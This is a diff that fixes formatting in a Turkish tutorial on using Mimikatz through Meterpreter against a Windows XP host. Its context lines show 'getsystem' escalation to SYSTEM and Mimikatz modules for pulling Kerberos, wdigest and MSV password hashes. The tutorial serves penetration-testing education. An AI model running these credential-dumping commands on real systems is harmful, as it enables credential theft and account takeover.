@@ -49,7 +49,7 @@ Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir
 
 ```bash
 meterpreter > getsystem
-...got system **(**via technique 1**)**.
+...got system (via technique 1).
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
@@ -67,7 +67,7 @@ Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYS
 ```bash
 meterpreter > sysinfo
 Computer        : WINXP-E95CE571A1
-OS              : Windows XP **(**Build 2600, Service Pack 3**)**.
+OS              : Windows XP (Build 2600, Service Pack 3).
 Architecture    : x86
 System Language : en_US
 Meterpreter     : x86/win32
@@ -99,7 +99,7 @@ Mimikatz Commands
     kerberos          Attempt to retrieve kerberos creds
     livessp           Attempt to retrieve livessp creds
     mimikatz_command  Run a custom commannd
-    msv               Attempt to retrieve msv creds **(**hashes**)**
+    msv               Attempt to retrieve msv creds (hashes)
     ssp               Attempt to retrieve ssp creds
     tspkg             Attempt to retrieve tspkg creds
     wdigest           Attempt to retrieve wdigest creds
@@ -116,7 +116,7 @@ Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içler
 
 ```bash
 meterpreter > mimikatz_command -f version
-mimikatz 1.0 x86 **(**RC**)** **(**Nov  7 2013 08:21:02**)**
+mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)
 ```
 
 
@@ -269,7 +269,7 @@ meterpreter > mimikatz_command -f handle::
 Module : 'handle' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des handles
-list              - Affiche les handles du système **(**pour le moment juste les processus et tokens**)**
+list              - Affiche les handles du système (pour le moment juste les processus et tokens)
 processStop       - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
 tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handles
 nullAcl           - Positionne une ACL null sur des Handles
@@ -322,9 +322,9 @@ Bu seçeneklerden, listeleme modülünü kullanalım.
 meterpreter > mimikatz_command -f service::list
 ...snip...
         WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
-        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device **(**RFCOMM Protocol TDI**)**
-        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call **(**RPC**)** Locator
-  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call **(**RPC**)**
+        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device (RFCOMM Protocol TDI)
+        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call (RPC) Locator
+  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call (RPC)
         WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
   760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
         WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
@@ -350,7 +350,7 @@ meterpreter > mimikatz_command -f crypto::
 Module : 'crypto' identifié, mais commande '' introuvable
 
 Description du module : Cryptographie et certificats
-listProviders   - Liste les providers installés**)**
+listProviders   - Liste les providers installés)
   listStores    - Liste les magasins système
 listCertificates        - Liste les certificats
     listKeys    - Liste les conteneurs de clés
